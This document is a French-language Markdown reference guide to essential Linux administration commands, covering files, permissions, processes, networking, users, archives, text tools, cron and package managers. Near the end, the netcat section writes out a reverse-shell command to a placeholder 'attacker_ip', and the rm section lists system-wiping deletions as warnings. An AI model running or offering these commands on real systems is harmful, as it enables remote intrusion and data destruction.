# 🐧 Linux - Commandes Essentielles

Guide complet des commandes Linux indispensables pour tout administrateur système.

---

## 📁 Navigation et Gestion de Fichiers

### pwd - Print Working Directory

```bash
# Afficher le répertoire courant
pwd
# /home/user/documents

# Version absolue (résout les symlinks)
pwd -P
```

### cd - Change Directory

```bash
# Aller au home directory
cd
cd ~

# Aller au répertoire parent
cd ..

# Aller au répertoire précédent
cd -

# Chemins absolus
cd /var/log
cd /etc/nginx

# Chemins relatifs
cd ../../../
cd ./subfolder
```

### ls - List

```bash
# Liste simple
ls

# Liste détaillée (long format)
ls -l
# -rw-r--r-- 1 user group 4096 Feb 21 10:00 file.txt

# Afficher fichiers cachés
ls -a

# Tout combiné + human-readable sizes
ls -lah

# Trier par date de modification
ls -lt

# Trier par taille
ls -lS

# Récursif
ls -R

# Afficher les inodes
ls -i
```

**Comprendre ls -l :**
```
-rw-r--r--  1  user  group  4096  Feb 21 10:00  file.txt
│││││││││  │   │     │      │     │            │
│││││││││  │   │     │      │     │            └─ Nom
│││││││││  │   │     │      │     └─ Date modification
│││││││││  │   │     │      └─ Taille (octets)
│││││││││  │   │     └─ Groupe
│││││││││  │   └─ Propriétaire
│││││││││  └─ Nombre de liens
└┴┴┴┴┴┴┴┴─ Permissions (type + user + group + others)
```

### cp - Copy

```bash
# Copier fichier
cp source.txt destination.txt

# Copier dans un dossier
cp file.txt /tmp/

# Copier récursif (dossier)
cp -r /source/folder /destination/folder

# Préserver permissions et timestamps
cp -p file.txt backup.txt

# Mode verbeux (afficher ce qui est copié)
cp -v file.txt /tmp/

# Copier seulement si source plus récent
cp -u source.txt destination.txt

# Demander confirmation avant écrasement
cp -i file.txt existing_file.txt

# Force (écraser sans demander)
cp -f file.txt destination.txt
```

### mv - Move / Rename

```bash
# Renommer fichier
mv oldname.txt newname.txt

# Déplacer fichier
mv file.txt /tmp/

# Déplacer multiple fichiers
mv file1.txt file2.txt file3.txt /destination/

# Mode verbeux
mv -v source.txt destination.txt

# Demander confirmation
mv -i file.txt existing.txt

# Ne pas écraser fichiers existants
mv -n file.txt existing.txt
```

### rm - Remove

```bash
# Supprimer fichier
rm file.txt

# Supprimer récursif (dossier)
rm -r folder/

# Force (pas de confirmation)
rm -rf folder/

# Demander confirmation pour chaque fichier
rm -i file.txt

# Verbeux
rm -v file.txt

# Supprimer seulement fichiers vides
rmdir empty_folder/

# ⚠️ DANGER : Ne JAMAIS faire
# rm -rf /    # Supprime TOUT le système
# rm -rf /*   # Idem
# rm -rf ~/*  # Supprime tout votre home
```

**Alternative sûre : trash-cli**
```bash
# Installer
apt install trash-cli

# Utiliser trash au lieu de rm
trash file.txt

# Restaurer depuis la corbeille
trash-restore

# Vider la corbeille
trash-empty
```

### mkdir - Make Directory

```bash
# Créer dossier
mkdir newfolder

# Créer structure de dossiers (parents)
mkdir -p /parent/child/grandchild

# Créer avec permissions spécifiques
mkdir -m 755 newfolder

# Verbeux
mkdir -v newfolder
```

### touch - Create Empty File / Update Timestamp

```bash
# Créer fichier vide
touch newfile.txt

# Créer multiple fichiers
touch file1.txt file2.txt file3.txt

# Mettre à jour timestamp uniquement (sans créer)
touch -c existing_file.txt

# Définir timestamp spécifique
touch -t 202602211200 file.txt
# Format: YYYYMMDDhhmm
```

---

## 🔐 Permissions et Ownership

### chmod - Change Mode (Permissions)

**Format numérique (octal) :**
```
r (read)    = 4
w (write)   = 2
x (execute) = 1

rwx = 4+2+1 = 7
rw- = 4+2+0 = 6
r-x = 4+0+1 = 5
r-- = 4+0+0 = 4
```

```bash
# 755 = rwxr-xr-x (owner: rwx, group: r-x, others: r-x)
chmod 755 script.sh

# 644 = rw-r--r-- (fichiers standards)
chmod 644 file.txt

# 600 = rw------- (fichiers privés)
chmod 600 private_key

# 777 = rwxrwxrwx (⚠️ DANGEREUX, tout le monde peut tout faire)
chmod 777 file.txt

# Récursif
chmod -R 755 /var/www/html

# Format symbolique
chmod u+x script.sh          # User: add execute
chmod g-w file.txt           # Group: remove write
chmod o=r file.txt           # Others: set to read only
chmod a+r file.txt           # All: add read

# u = user (owner)
# g = group
# o = others
# a = all

# Rendre exécutable
chmod +x script.sh
```

**Exemples pratiques :**
```bash
# Script shell exécutable
chmod 755 script.sh

# Fichier de config (privé)
chmod 600 ~/.ssh/id_rsa

# Dossier web accessible
chmod 755 /var/www/html

# Logs (écriture groupe)
chmod 664 /var/log/app.log

# SetUID (exécuter avec permissions owner)
chmod 4755 /usr/bin/passwd
```

### chown - Change Owner

```bash
# Changer propriétaire
chown user file.txt

# Changer propriétaire et groupe
chown user:group file.txt

# Récursif
chown -R user:group /var/www/

# Changer seulement le groupe
chown :group file.txt
# ou
chgrp group file.txt

# Préserver owner, changer seulement groupe
chown :nginx /var/www/html/index.html
```

**Exemples pratiques :**
```bash
# Donner ownership à www-data (Apache/Nginx)
chown -R www-data:www-data /var/www/html

# Fixer permissions SSH
chown user:user ~/.ssh
chmod 700 ~/.ssh
chmod 600 ~/.ssh/id_rsa
chmod 644 ~/.ssh/id_rsa.pub
chmod 644 ~/.ssh/authorized_keys
```

### umask - Default Permissions

```bash
# Afficher umask actuel
umask
# 0022

# Définir umask
umask 0022
# Nouveaux fichiers: 644 (666-022)
# Nouveaux dossiers: 755 (777-022)

# Umask pour fichiers privés
umask 0077
# Nouveaux fichiers: 600
# Nouveaux dossiers: 700
```

---

## ⚙️ Processus et Monitoring Système

### ps - Process Status

```bash
# Processus de l'utilisateur courant
ps

# Tous les processus (format BSD)
ps aux

# Tous les processus (format UNIX)
ps -ef

# Processus en arbre
ps auxf
ps -ef --forest

# Filtrer par nom
ps aux | grep nginx

# Trier par CPU
ps aux --sort=-%cpu | head -10

# Trier par RAM
ps aux --sort=-%mem | head -10

# Format personnalisé
ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%mem | head
```

**Comprendre ps aux :**
```
USER  PID  %CPU  %MEM    VSZ   RSS TTY  STAT START   TIME COMMAND
root    1   0.0   0.4 169204 13168  ?    Ss   08:00   0:02 /sbin/init
```
- **USER** : Propriétaire du processus
- **PID** : Process ID
- **%CPU** : Utilisation CPU
- **%MEM** : Utilisation RAM
- **VSZ** : Taille virtuelle (KB)
- **RSS** : Taille résidente (RAM réelle, KB)
- **TTY** : Terminal (? = pas de terminal)
- **STAT** : État (R=running, S=sleeping, Z=zombie)
- **START** : Heure de démarrage
- **TIME** : Temps CPU total
- **COMMAND** : Commande

### top / htop - Interactive Process Viewer

```bash
# Top (standard)
top

# Raccourcis dans top:
# q : quitter
# k : kill processus (demande PID)
# M : trier par RAM
# P : trier par CPU
# 1 : afficher tous les CPUs
# u : filtrer par user

# htop (plus visuel, nécessite installation)
htop

# Raccourcis htop:
# F9 : kill processus
# F6 : trier
# F3 : rechercher
# F4 : filtrer
# / : rechercher
```

### kill - Terminate Process

```bash
# SIGTERM (demande arrêt gracieux)
kill 1234

# SIGKILL (force kill, immédiat)
kill -9 1234
kill -KILL 1234

# SIGHUP (recharger config)
kill -HUP 1234

# Tuer par nom
killall nginx
pkill nginx

# Tuer tous les processus d'un user
pkill -u username

# Tuer processus matching pattern
pkill -f "python script.py"
```

**Signaux courants :**
```
1  SIGHUP   : Hang up (recharger config)
2  SIGINT   : Interrupt (Ctrl+C)
9  SIGKILL  : Kill immédiat (non bloquable)
15 SIGTERM  : Termination gracieuse (défaut)
18 SIGCONT  : Continue (reprendre processus)
19 SIGSTOP  : Stop (pause processus)
```

### systemctl - System Control (systemd)

```bash
# Démarrer service
systemctl start nginx

# Arrêter service
systemctl stop nginx

# Redémarrer service
systemctl restart nginx

# Recharger config (sans redémarrer)
systemctl reload nginx

# Statut service
systemctl status nginx

# Activer au démarrage
systemctl enable nginx

# Désactiver au démarrage
systemctl disable nginx

# Vérifier si activé
systemctl is-enabled nginx

# Lister tous les services
systemctl list-units --type=service

# Lister services actifs
systemctl list-units --type=service --state=running

# Lister services failed
systemctl list-units --type=service --state=failed

# Logs d'un service (journald)
journalctl -u nginx

# Logs en temps réel
journalctl -u nginx -f

# Logs depuis boot
journalctl -u nginx -b
```

### free - Memory Usage

```bash
# Afficher RAM
free

# Human-readable
free -h

# En MB
free -m

# En GB
free -g

# Mise à jour continue (tous les 2 secondes)
free -h -s 2
```

**Comprendre free -h :**
```
              total        used        free      shared  buff/cache   available
Mem:           15Gi       3.2Gi       8.1Gi       234Mi       4.2Gi        11Gi
Swap:         4.0Gi          0B       4.0Gi
```
- **total** : RAM totale
- **used** : RAM utilisée par processus
- **free** : RAM complètement libre
- **buff/cache** : RAM utilisée pour cache (récupérable)
- **available** : RAM disponible sans swapping

### df - Disk Free

```bash
# Afficher espace disque
df

# Human-readable
df -h

# Seulement types de filesystems locaux
df -h -x tmpfs -x devtmpfs

# Afficher inodes
df -i

# Filesystem spécifique
df -h /dev/sda1
```

### du - Disk Usage

```bash
# Taille répertoire courant
du -sh .

# Taille de chaque sous-dossier
du -h --max-depth=1 .

# Trier par taille
du -h --max-depth=1 | sort -hr

# Top 10 plus gros dossiers
du -h /var | sort -hr | head -10

# Taille d'un fichier spécifique
du -h file.txt
```

---

## 🌐 Réseau et Diagnostics

### ip - Network Configuration

```bash
# Afficher toutes les interfaces
ip addr
ip a

# Afficher seulement IPv4
ip -4 addr

# Afficher interface spécifique
ip addr show eth0

# Ajouter IP
ip addr add 192.168.1.100/24 dev eth0

# Supprimer IP
ip addr del 192.168.1.100/24 dev eth0

# Activer interface
ip link set eth0 up

# Désactiver interface
ip link set eth0 down

# Routes
ip route
ip route show

# Ajouter route
ip route add 10.0.0.0/24 via 192.168.1.1

# Route par défaut
ip route add default via 192.168.1.1

# Neighbors (ARP table)
ip neigh
ip neigh show
```

### ping - Test Connectivity

```bash
# Ping basique
ping google.com

# Limiter à 4 paquets
ping -c 4 google.com

# Interval custom (0.2 secondes)
ping -i 0.2 192.168.1.1

# Flood ping (⚠️ peut crasher réseau)
ping -f 192.168.1.1

# Taille paquet custom
ping -s 1000 google.com
```

### netstat - Network Statistics

```bash
# Toutes les connexions
netstat -a

# Seulement TCP
netstat -at

# Seulement UDP
netstat -au

# Afficher PIDs
netstat -tulpn

# t = TCP
# u = UDP
# l = Listening
# p = PID/Program
# n = Numérique (pas de résolution DNS)

# Ports en écoute
netstat -tlnp

# Connexions établies
netstat -tn

# Stats réseau
netstat -s

# Table de routage
netstat -r
```

### ss - Socket Statistics (modern netstat)

```bash
# Toutes les connexions
ss -a

# TCP listening
ss -tln

# Avec processus
ss -tlnp

# Connexions établies
ss -t state established

# Filtrer par port
ss -tlnp | grep :80
ss -tlnp sport = :22
```

### curl - Transfer Data

```bash
# GET request
curl https://example.com

# Sauvegarder output
curl https://example.com -o output.html

# Sauvegarder avec nom original
curl -O https://example.com/file.zip

# Afficher headers
curl -I https://example.com

# Verbeux
curl -v https://example.com

# POST data
curl -X POST https://api.example.com/users \
  -H "Content-Type: application/json" \
  -d '{"name":"John","age":30}'

# Upload fichier
curl -X POST https://example.com/upload \
  -F "file=@/path/to/file.pdf"

# Authentication
curl -u username:password https://example.com

# Follow redirects
curl -L https://example.com

# Download avec progress bar
curl -# -O https://example.com/large-file.zip

# Timeout
curl --max-time 30 https://example.com
```

### wget - Download Files

```bash
# Download simple
wget https://example.com/file.zip

# Download récursif (site complet)
wget -r https://example.com

# Continuer download interrompu
wget -c https://example.com/large-file.zip

# Download en arrière-plan
wget -b https://example.com/file.zip

# Limite vitesse (500k)
wget --limit-rate=500k https://example.com/file.zip

# User-Agent custom
wget --user-agent="Mozilla/5.0" https://example.com

# Authentication
wget --user=admin --password=pass https://example.com/file.zip

# Mirror site (with delays pour ne pas DDoS)
wget --mirror --wait=2 --random-wait https://example.com
```

### nslookup / dig - DNS Lookup

```bash
# nslookup
nslookup google.com

# Spécifier DNS server
nslookup google.com 8.8.8.8

# dig (plus détaillé)
dig google.com

# Query type spécifique
dig google.com A        # IPv4
dig google.com AAAA     # IPv6
dig google.com MX       # Mail servers
dig google.com NS       # Name servers
dig google.com TXT      # TXT records

# Reverse lookup
dig -x 8.8.8.8

# Trace DNS resolution
dig +trace google.com

# Short answer
dig +short google.com
```

---

## 👥 Gestion Utilisateurs et Groupes

### useradd / adduser - Create User

```bash
# Créer utilisateur (basique)
useradd john

# Créer avec home directory
useradd -m john

# Spécifier shell
useradd -m -s /bin/bash john

# Spécifier groupes
useradd -m -G sudo,docker john

# Définir UID
useradd -u 1500 john

# Créer utilisateur système (pas de home)
useradd -r -s /bin/false serviceuser

# adduser (interactive, Debian/Ubuntu)
adduser john
```

### usermod - Modify User

```bash
# Changer shell
usermod -s /bin/zsh john

# Ajouter à un groupe
usermod -aG docker john
# -a = append (important !)

# Changer home directory
usermod -d /home/newpath john

# Verrouiller compte
usermod -L john

# Déverrouiller
usermod -U john

# Changer username
usermod -l newname oldname
```

### userdel - Delete User

```bash
# Supprimer utilisateur
userdel john

# Supprimer utilisateur + home directory
userdel -r john

# Force delete (même si connecté)
userdel -f john
```

### passwd - Change Password

```bash
# Changer son propre mot de passe
passwd

# Changer mot de passe d'un user (root)
passwd john

# Forcer changement au prochain login
passwd -e john

# Verrouiller compte
passwd -l john

# Déverrouiller
passwd -u john

# Voir status
passwd -S john
```

### groupadd / groupdel - Manage Groups

```bash
# Créer groupe
groupadd developers

# Avec GID spécifique
groupadd -g 1500 developers

# Supprimer groupe
groupdel developers

# Afficher groupes d'un user
groups john
id john

# Ajouter user à groupe
usermod -aG developers john
# ou
gpasswd -a john developers

# Retirer user d'un groupe
gpasswd -d john developers
```

---

## 📦 Archivage et Compression

### tar - Tape Archive

```bash
# Créer archive
tar -cvf archive.tar /path/to/folder
# c = create
# v = verbose
# f = file

# Créer archive compressée (gzip)
tar -czvf archive.tar.gz /path/to/folder
# z = gzip

# Créer archive compressée (bzip2, meilleure compression)
tar -cjvf archive.tar.bz2 /path/to/folder
# j = bzip2

# Créer archive compressée (xz, meilleure compression)
tar -cJvf archive.tar.xz /path/to/folder
# J = xz

# Extraire archive
tar -xvf archive.tar
tar -xzvf archive.tar.gz

# Extraire dans dossier spécifique
tar -xzvf archive.tar.gz -C /destination/path

# Lister contenu sans extraire
tar -tvf archive.tar
tar -tzvf archive.tar.gz

# Extraire un fichier spécifique
tar -xzvf archive.tar.gz file.txt

# Exclure fichiers
tar -czvf backup.tar.gz --exclude='*.log' /var/www

# Ajouter fichiers à archive existante
tar -rvf archive.tar newfile.txt
```

**Formats :**
```
.tar        : Non compressé
.tar.gz     : gzip (rapide, compression moyenne)
.tar.bz2    : bzip2 (lent, bonne compression)
.tar.xz     : xz (très lent, excellente compression)
.tgz        : équivalent à .tar.gz
```

### gzip / gunzip - Compress Files

```bash
# Compresser fichier
gzip file.txt
# Crée file.txt.gz (supprime original)

# Garder fichier original
gzip -k file.txt

# Compresser multiple fichiers
gzip file1.txt file2.txt file3.txt

# Décompresser
gunzip file.txt.gz
# ou
gzip -d file.txt.gz

# Afficher contenu sans décompresser
zcat file.txt.gz
zless file.txt.gz
```

### zip / unzip - ZIP Archives

```bash
# Créer zip
zip archive.zip file1.txt file2.txt

# Zip récursif (dossier)
zip -r archive.zip /path/to/folder

# Ajouter à zip existant
zip archive.zip newfile.txt

# Extraire zip
unzip archive.zip

# Extraire dans dossier spécifique
unzip archive.zip -d /destination/

# Lister contenu
unzip -l archive.zip

# Tester intégrité
unzip -t archive.zip

# Mot de passe
zip -e -r secure.zip /path/to/folder
unzip secure.zip  # demandera password
```

---

## 🔍 Recherche et Filtrage

### find - Find Files

```bash
# Chercher fichier par nom
find /path -name "file.txt"

# Insensible à la casse
find /path -iname "file.txt"

# Chercher par extension
find /path -name "*.log"

# Chercher dossiers uniquement
find /path -type d

# Chercher fichiers uniquement
find /path -type f

# Par taille
find /path -size +100M        # Plus de 100MB
find /path -size -10k         # Moins de 10KB

# Par date modification
find /path -mtime -7          # Modifiés dans les 7 derniers jours
find /path -mtime +30         # Modifiés il y a plus de 30 jours

# Par permissions
find /path -perm 777

# Fichiers vides
find /path -empty

# Exécuter commande sur résultats
find /path -name "*.log" -exec rm {} \;
find /path -name "*.txt" -exec chmod 644 {} \;

# Avec confirmation
find /path -name "*.bak" -ok rm {} \;

# Limiter profondeur
find /path -maxdepth 2 -name "*.conf"
```

**Exemples pratiques :**
```bash
# Trouver fichiers logs > 100MB
find /var/log -type f -size +100M

# Trouver fichiers modifiés aujourd'hui
find /home/user -type f -mtime 0

# Trouver et supprimer fichiers .tmp
find /tmp -name "*.tmp" -type f -delete

# Trouver fichiers avec permissions 777 (danger !)
find / -perm 777 -type f 2>/dev/null
```

### grep - Pattern Matching

```bash
# Chercher dans fichier
grep "pattern" file.txt

# Insensible à la casse
grep -i "pattern" file.txt

# Inverser match (lignes ne contenant PAS le pattern)
grep -v "pattern" file.txt

# Compter occurrences
grep -c "pattern" file.txt

# Afficher numéro de ligne
grep -n "pattern" file.txt

# Récursif dans dossier
grep -r "pattern" /path/to/folder

# Avec contexte (3 lignes avant/après)
grep -C 3 "pattern" file.txt
grep -A 3 "pattern" file.txt  # After
grep -B 3 "pattern" file.txt  # Before

# Regex
grep -E "pattern1|pattern2" file.txt

# Chercher mot exact
grep -w "word" file.txt

# Afficher seulement match (pas toute la ligne)
grep -o "pattern" file.txt

# Multiple fichiers
grep "pattern" file1.txt file2.txt

# Lister seulement noms de fichiers
grep -l "pattern" *.txt

# Coloriser output
grep --color=auto "pattern" file.txt
```

**Exemples pratiques :**
```bash
# Trouver erreurs dans logs
grep -i "error" /var/log/syslog

# IPs dans fichier
grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' file.txt

# Compter lignes vides
grep -c "^$" file.txt

# Fichiers PHP contenant "eval("
grep -r "eval(" /var/www/html --include="*.php"
```

### awk - Text Processing

```bash
# Afficher colonne 1
awk '{print $1}' file.txt

# Colonnes multiples
awk '{print $1, $3}' file.txt

# Avec séparateur custom
awk -F',' '{print $1}' file.csv

# Condition
awk '$3 > 100' file.txt

# Sum colonne
awk '{sum+=$1} END {print sum}' file.txt

# Afficher nombre de lignes
awk 'END {print NR}' file.txt

# Filtrer et formater
awk '$3 > 100 {print $1, ":", $3}' file.txt
```

**Exemples pratiques :**
```bash
# Extraire IPs de netstat
netstat -tn | awk '{print $5}' | cut -d: -f1 | sort | uniq

# Top 10 IPs par fréquence
awk '{print $1}' access.log | sort | uniq -c | sort -nr | head -10

# Calculer taille totale (ls -l)
ls -l | awk '{sum+=$5} END {print sum/1024/1024 " MB"}'
```

### sed - Stream Editor

```bash
# Remplacer première occurrence
sed 's/old/new/' file.txt

# Remplacer toutes occurrences
sed 's/old/new/g' file.txt

# Remplacer et sauvegarder (en place)
sed -i 's/old/new/g' file.txt

# Backup avant modification
sed -i.bak 's/old/new/g' file.txt

# Supprimer lignes
sed '/pattern/d' file.txt

# Supprimer ligne n
sed '5d' file.txt

# Supprimer lignes 5-10
sed '5,10d' file.txt

# Afficher ligne n
sed -n '5p' file.txt

# Afficher lignes 5-10
sed -n '5,10p' file.txt

# Insérer ligne après match
sed '/pattern/a New line here' file.txt

# Insére ligne avant match
sed '/pattern/i New line here' file.txt
```

**Exemples pratiques :**
```bash
# Remplacer IP dans config
sed -i 's/192.168.1.1/10.0.0.1/g' /etc/config.conf

# Supprimer lignes vides
sed '/^$/d' file.txt

# Supprimer commentaires
sed '/^#/d' file.txt

# Ajouter # devant chaque ligne
sed 's/^/#/' file.txt
```

---

## ✏️ Édition de Texte

### vim - Vi Improved

**Modes :**
- **Normal** : Navigation et commandes (ESC)
- **Insert** : Édition (i, a, o)
- **Visual** : Sélection (v)
- **Command** : Commandes ex (:)

**Commandes essentielles :**
```bash
# Ouvrir fichier
vim file.txt

# Modes
i         # Insert avant curseur
a         # Insert après curseur
o         # Nouvelle ligne en dessous
O         # Nouvelle ligne au dessus
ESC       # Retour mode Normal

# Navigation
h j k l   # Gauche, Bas, Haut, Droite
w         # Mot suivant
b         # Mot précédent
0         # Début de ligne
$         # Fin de ligne
gg        # Début de fichier
G         # Fin de fichier
:42       # Aller ligne 42

# Édition
x         # Supprimer caractère
dd        # Supprimer ligne
yy        # Copier ligne
p         # Coller
u         # Undo
Ctrl+r    # Redo

# Recherche
/pattern  # Chercher en avant
?pattern  # Chercher en arrière
n         # Match suivant
N         # Match précédent

# Sauvegarder et quitter
:w        # Sauvegarder
:q        # Quitter
:wq       # Sauvegarder et quitter
:q!       # Quitter sans sauvegarder
:x        # Sauvegarder et quitter (alias :wq)

# Remplacer
:%s/old/new/g     # Tout le fichier
:s/old/new/g      # Ligne courante

# Visual mode
v         # Visual mode (caractères)
V         # Visual Line mode
Ctrl+v    # Visual Block mode
```

### nano - Simple Text Editor

```bash
# Ouvrir fichier
nano file.txt

# Raccourcis (Ctrl = ^)
^O        # Sauvegarder (Write Out)
^X        # Quitter
^K        # Couper ligne
^U        # Coller
^W        # Chercher
^\        # Chercher et remplacer
^C        # Afficher position curseur
^_        # Aller à ligne n
^V        # Page suivante
^Y        # Page précédente
```

---

## ⏰ Cron et Automatisation

### crontab - Schedule Tasks

```bash
# Éditer crontab
crontab -e

# Lister crontab
crontab -l

# Supprimer crontab
crontab -r

# Éditer crontab d'un user (root)
crontab -e -u username
```

**Format crontab :**
```
* * * * * command
│ │ │ │ │
│ │ │ │ └─ Jour de la semaine (0-7, 0=Dimanche)
│ │ │ └─── Mois (1-12)
│ │ └───── Jour du mois (1-31)
│ └─────── Heure (0-23)
└───────── Minute (0-59)
```

**Exemples :**
```bash
# Toutes les 5 minutes
*/5 * * * * /path/to/script.sh

# Tous les jours à 2h30 AM
30 2 * * * /path/to/backup.sh

# Tous les lundis à 9h00
0 9 * * 1 /path/to/weekly-report.sh

# Le 1er de chaque mois à minuit
0 0 1 * * /path/to/monthly-task.sh

# Tous les jours à 3h15, 15h15, 23h15
15 3,15,23 * * * /path/to/script.sh

# Heures de bureau (9h-17h) tous les jours ouvrés
0 9-17 * * 1-5 /path/to/business-hours-task.sh

# Variables spéciales
@reboot /path/to/startup.sh       # Au démarrage
@daily /path/to/daily.sh          # Tous les jours à minuit
@hourly /path/to/hourly.sh        # Toutes les heures
@weekly /path/to/weekly.sh        # Tous les dimanches à minuit
@monthly /path/to/monthly.sh      # Le 1er de chaque mois
@yearly /path/to/yearly.sh        # 1er janvier
```

**Redirection output :**
```bash
# Logs
0 2 * * * /backup.sh >> /var/log/backup.log 2>&1

# Envoyer par email (si mail configuré)
0 2 * * * /backup.sh 2>&1 | mail -s "Backup Report" admin@example.com

# Silence (pas d'output)
0 2 * * * /backup.sh > /dev/null 2>&1
```

---

## 📦 Package Management

### apt (Debian/Ubuntu)

```bash
# Mettre à jour liste paquets
apt update

# Upgrade tous les paquets
apt upgrade

# Full upgrade (avec gestion dépendances)
apt full-upgrade

# Installer paquet
apt install nginx

# Installer multiple paquets
apt install nginx mysql-server php

# Installer version spécifique
apt install nginx=1.18.0-0ubuntu1

# Supprimer paquet
apt remove nginx

# Supprimer + fichiers config
apt purge nginx

# Supprimer + dépendances inutiles
apt autoremove

# Rechercher paquet
apt search nginx

# Info sur paquet
apt show nginx

# Lister paquets installés
apt list --installed

# Nettoyer cache
apt clean
apt autoclean
```

### yum / dnf (RHEL/CentOS/Fedora)

```bash
# dnf (moderne, Fedora/CentOS 8+)
# yum (ancien, CentOS 7)

# Mettre à jour
dnf update
yum update

# Installer
dnf install nginx
yum install nginx

# Supprimer
dnf remove nginx
yum remove nginx

# Rechercher
dnf search nginx
yum search nginx

# Info
dnf info nginx
yum info nginx

# Lister installés
dnf list installed
yum list installed

# Nettoyer cache
dnf clean all
yum clean all

# Groupes de paquets
dnf grouplist
dnf groupinstall "Development Tools"
```

---

## 🔧 Commandes Système Avancées

### systemd-analyze - Boot Performance

```bash
# Temps de boot
systemd-analyze

# Services les plus lents au boot
systemd-analyze blame

# Chaîne critique de boot
systemd-analyze critical-chain

# Graphe de boot
systemd-analyze plot > boot.svg
```

### lsof - List Open Files

```bash
# Fichiers ouverts par processus
lsof -p 1234

# Processus utilisant un fichier
lsof /var/log/syslog

# Fichiers ouverts par user
lsof -u username

# Ports réseau ouverts
lsof -i

# Port spécifique
lsof -i :80
lsof -i :22

# TCP seulement
lsof -iTCP

# Connexions établies
lsof -iTCP -sTCP:ESTABLISHED
```

### strace - Trace System Calls

```bash
# Tracer commande
strace ls

# Tracer processus existant
strace -p 1234

# Output vers fichier
strace -o trace.log ls

# Compter syscalls
strace -c ls

# Tracer seulement certains syscalls
strace -e open,read ls
```

### nc (netcat) - Network Swiss Army Knife

```bash
# Port scanning
nc -zv 192.168.1.100 22

# Scan plage de ports
nc -zv 192.168.1.100 20-80

# Listen sur port
nc -l 1234

# Envoyer fichier (serveur)
nc -l 1234 < file.txt

# Recevoir fichier (client)
nc 192.168.1.100 1234 > file.txt

# Chat simple
# Server:
nc -l 1234
# Client:
nc 192.168.1.100 1234

# Reverse shell (⚠️ usage pentest uniquement)
# Target:
nc -e /bin/bash attacker_ip 4444
# Attacker:
nc -l 4444
```

---

**🎓 Prochaine étape : [Docker Commands](./docker-commands.md) →**
